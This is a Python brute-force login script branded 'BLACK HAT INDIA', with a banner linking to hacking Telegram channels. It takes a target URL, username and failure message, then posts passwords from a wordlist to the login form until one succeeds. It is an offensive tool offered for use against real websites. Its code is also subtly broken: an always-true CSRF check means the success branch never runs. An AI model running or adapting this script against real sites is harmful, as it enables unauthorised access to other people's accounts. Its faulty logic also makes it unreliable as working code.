######################################################################################################
# Title: Guru Brute force                                                                                 #
# Author: BLACK HAT INDIA                                                                              #
# Github : https://github.com/x9999999999/GuruBruteForce.git                                                            #
######################################################################################################

print (""" 

   d888b  db    db d8888b. db    db      d8888b. d8888b. db    db d888888b d88888b 
88' Y8b 88    88 88  `8D 88    88      88  `8D 88  `8D 88    88 `~~88~~' 88'     
88      88    88 88oobY' 88    88      88oooY' 88oobY' 88    88    88    88ooooo 
88  ooo 88    88 88`8b   88    88      88~~~b. 88`8b   88    88    88    88~~~~~ 
88. ~8~ 88b  d88 88 `88. 88b  d88      88   8D 88 `88. 88b  d88    88    88.     
 Y888P  ~Y8888P' 88   YD ~Y8888P'      Y8888P' 88   YD ~Y8888P'    YP    Y88888P   
                                                                            
                   JOIN US :-
       https://t.me/ANONYMOUS_HACKING_IND
       https://t.me/BLACK_HAT_IND


""")

z = """     



                      Checking the Server............!
        
        ]01000010 01110010 01110101 01110100 01100101 00100000 01100110 01101111 01110010 01100011 01100101 00100000 01110010 01110101 01101110 01101001 01101110 01100111 ............



"""


import requests
import time
import sys

url = input("Enter Target Url: ")
username = input("Enter Target Username: ")
error = input("Enter Wrong Password Error Message: ")

for c in z:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.02)

try: 
    def bruteCracking(username,url,error):
        count = 0
        for password in passwords:
            password = password.strip()
            count = count + 1
            print("Trying Password: "+ str(count) + ' Time For => ' + password)
            data_dict = {"LogInID": username,"Password":password, "Log In":"submit"}
            response = requests.post(url, data=data_dict)
            if error in str(response.content):
                pass
            elif "CSRF" or "csrf" in str(response.content):
                print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
                exit()
            else:
                print("Username: ---> " + username)
                print("Password: ---> " + password)
                exit()
except:
    print("Some Error Occurred Please Check Your Internet Connection !!")

with open("passwords.txt", "r") as passwords:
    bruteCracking(username,url,error)

print("[!!] password not in list")